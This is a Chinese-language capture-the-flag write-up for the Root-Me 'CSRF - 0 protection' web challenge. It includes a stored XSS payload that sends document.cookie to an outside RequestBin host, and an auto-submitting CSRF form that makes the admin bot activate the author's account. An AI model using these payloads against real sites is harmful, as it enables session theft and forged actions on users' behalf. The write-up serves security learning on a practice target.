## [[Root-Me](https://www.root-me.org/)] [[Web-Client](https://www.root-me.org/en/Challenges/Web-Client/)] [[CSRF - 0 protection](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection)] [[解题报告](http://exp-blog.com/2019/01/13/pid-2927/)]

------

已经很直白提示是 CSRF 题型。

点击 Register 随意注册一个账号，如 `exp`，密码 `123456` 。

然后点击 Login 登录，登录后点击 Profile 切到个人档案，发现有 4 个选项卡，其中：

- Contact ： 可以发送一条消息给 admin 留言， 有个 robot-admin 会定时轮询查看
- Profile ： 激活当前账号，但是非 admin 无法操作
- Private ： 查看账号激活后信息，这就是最终目标
- Logout ： 登出，没用

很明显 Contact 就是注入点，且通过抓取 HTTP 请求发现， Email 虽然会校验格式，但是可以不填，而且也不会作为 HTTP 请求的参数发送出去，因此注入点就是 Comment 输入框。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B10%5D%20%5B35P%5D%20CSRF%20-%200%20protection/imgs/01.png)

至此，解此题有两种思路：

- ① 使用【[Web-Client : XSS - Stored 1](http://exp-blog.com/2019/01/13/pid-2922/)】的思路把 admin 的 Cookie 发到我们的服务器，窃取其 Cookie 后再激活
- ② 直接构造 CSRF 伪装 admin 的身份进行激活

首先试试第 ① 种思路，在 Contact 选项卡的 Comment 输入框构造一个 payloads 提交：

`<srcipt>document.write("<img src='${HOST}?tk='"+document.cookie+" />");</srcipt>`

（其中 `${HOST}` 是使用 [RequestBin](https://requestbin.fullcontact.com/) 生成的临时 HTTP 服务器，详见【[Web-Client : XSS - Stored 1](http://exp-blog.com/2019/01/13/pid-2922/)】，不再赘述）

提交成功后会提示 `Your message has been posted. The administrator will contact you later.` 。

等了一会， [RequestBin](https://requestbin.fullcontact.com/) 服务器收到了消息，说明我们注入 XSS 成功，但是消息中并没有 admin 的 Cookie ，很可能是 Cookie 启用了 HttpOnly 的缘故，因此第 ① 种思路不可行，改用第 ② 种思路，即 CSRF。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B10%5D%20%5B35P%5D%20CSRF%20-%200%20protection/imgs/02.png)

要执行 CSRF ，即需要令 admin 在读取 Comment 的时候触发一个激活账号的 POST，因此需要先获得这个 POST 请求的格式，再构造我们期望的内容。

切到 Profile 选项卡，发现 Status 是不可用的，并且点击 submit 后提示 `You're not an admin!`，不过不影响我们捕获 POST 请求。

打开浏览器开发者工具，切到 Elements ，把 Status 的 `disabled` 属性删掉。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B10%5D%20%5B35P%5D%20CSRF%20-%200%20protection/imgs/03.png)

打开 Burp Suite -> Proxy -> HTTP history ，然后点击页面的 submit 按钮，即可捕获到激活账号的 POST 请求。

利用这个 POST 请求可以构造 payloads 如下，将其拷贝到 Contact 选项卡的 Comment 输入框提交即可：

```html
<form name="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
    <input type="hidden" name="username" value="exp">  <!-- 激活账号，根据实际修改  -->
    <input type="hidden" name="status" value="on">  <!-- 激活动作 -->
</form>
<script>document.csrf.submit()</script>
```

多刷新几次 Private 选项卡，等待 robot-admin 触发 payloads，最终得到 flag，完成挑战。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B10%5D%20%5B35P%5D%20CSRF%20-%200%20protection/imgs/04.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
